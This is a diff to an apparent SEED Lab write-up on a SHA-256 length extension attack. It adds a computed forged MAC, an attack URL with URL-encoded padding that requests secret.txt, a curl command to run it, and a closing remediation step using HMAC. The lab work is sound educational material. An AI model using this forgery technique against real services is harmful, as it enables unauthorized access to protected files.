@@ -44,7 +44,7 @@ I calculated the SHA-256 padding for the 64-byte block.
     * *Note: The C code needs the total length of the forged message to finalize the hash correctly.*
 
 length_ext.c after 2 and 3
-Change Python file, adding hash into registers, and comment out length field
+Change C file, adding hash into registers, and comment out length field
 ```
 #include <stdio.h>
 #include <arpa/inet.h>
@@ -98,12 +98,30 @@ int main(int argc, const char *argv[]) {
     gcc length_ext.c -o length_ext -lcrypto
     ./length_ext
     ```
-5.  Construct the Attack URL:
+
+    Result from running:
+    ```4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```
+    
+6.  Construct the Attack URL:
     `http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1` + `[Padding URL Encoded]` + `&download=secret.txt` + `&mac=[New_Forged_MAC]`
+
+URL contructed
+    ```http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```
+run in terminal
+```bash
+    curl "http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1"
+ ```
+
+expected result
+<img width="688" height="420" alt="image" src="https://github.com/user-attachments/assets/d9c84e1a-c3e6-4623-b92b-ff1c2b800d05" />
+
+
+
 
 
 ## Task 4 (Remediation)
 1.  Open `lab.py` (the server code).
 2.  Replace the insecure SHA-256 concatenation with `hmac.new`.
 3.  Rebuild the docker container (`dcbuild && dcup`) and verify the attack above no longer works.
+
 
